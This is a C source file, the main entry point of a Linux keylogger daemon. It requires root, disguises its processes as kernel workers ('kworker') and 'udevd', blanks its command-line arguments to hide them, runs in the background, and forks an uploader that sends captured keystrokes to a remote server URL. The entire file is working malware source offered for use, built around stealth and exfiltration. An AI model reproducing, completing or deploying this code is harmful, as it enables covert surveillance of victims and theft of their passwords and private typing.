/**
 * author: Sanjay Vijayakumar
 * description: This is the main file for the keylogger daemon.
 * It initializes the daemon, sets up the process name, and starts the uploader.
 * It also handles command line arguments for verbosity and help.
 * The daemon runs in the background and logs key events.
 * It uses a separate process for uploading data to a remote server.
 * The daemon also ensures that only one instance is running at a time.
 */

#include <stdio.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <errno.h>
#include <syslog.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include "../include/daemon.h"
#include "../include/logger.h"
#include "../include/uploader.h"

__pid_t sender_pid;
char *url = NULL;

void cleanup(void)
{
    // Remove the PID file
    unlink(PID_FILE);
    syslog(LOG_INFO, "Daemon exiting. Cleaned up PID file.");
}

void spoof_process_name(int argc, char **argv)
{
    const char *fake_name = "kworker/u8:1";
    strncpy(argv[0], fake_name, strlen(argv[0]));
    for (int i = 1; i < argc; i++)
    {
        memset(argv[i], 0, strlen(argv[i]));
    }
}

int main(int argc, char *argv[])
{

    if(geteuid() != 0){
        fprintf(stderr, "This program must be run as root.\n");
        return 1;
    }

    if (is_already_running())
    {
        printf("Another instance is already running.\n");
        return 1;
    }


    char device[MAX_SIZE] = "none";
    char handler[MAX_SIZE] = "none";

    for (int i = 1; i < argc; i++)
    {

        if (strcmp(argv[i], "--remote") == 0 || strcmp("--r", argv[i]) == 0)
        {
            url = strdup(argv[i + 1]);  
            syslog(LOG_INFO, "Remote server URL set to: %s", url);
        }
        if (strcmp(argv[i], "--h") == 0 || strcmp(argv[i], "--help") == 0)
        {
            printf("A Linux API Keylogger\n");
            printf("Usage: keylogger [options]\n");
            printf("options\n");
            printf("  --remote <url>  Set the remote server URL for keylog uploads\n");
            printf("  --help          Show this help message\n");
            exit(0);
        }
    }

    spoof_process_name(argc,argv);
    daemonize();
    atexit(cleanup);

    if (url != NULL)
    {
        sender_pid = fork();
        if (sender_pid == 0)
        {   
            prctl(PR_SET_PDEATHSIG, SIGTERM);
            prctl(PR_SET_NAME, "udevd", 0, 0, 0);
            run_uploader();
        }
        else if (sender_pid > 0)
        {   
            prctl(PR_SET_NAME, "kworker/u8:3", 0, 0, 0);
            get_handler(device, handler);
            connect_handler(handler);
        }
        else
        {
            syslog(LOG_ERR, "Fork failed: %s", strerror(errno));
            exit(EXIT_FAILURE);
        }
    }else{
        prctl(PR_SET_NAME, "kworker/u8:3", 0, 0, 0);
        get_handler(device, handler);
        connect_handler(handler);
    }

    return 0;
}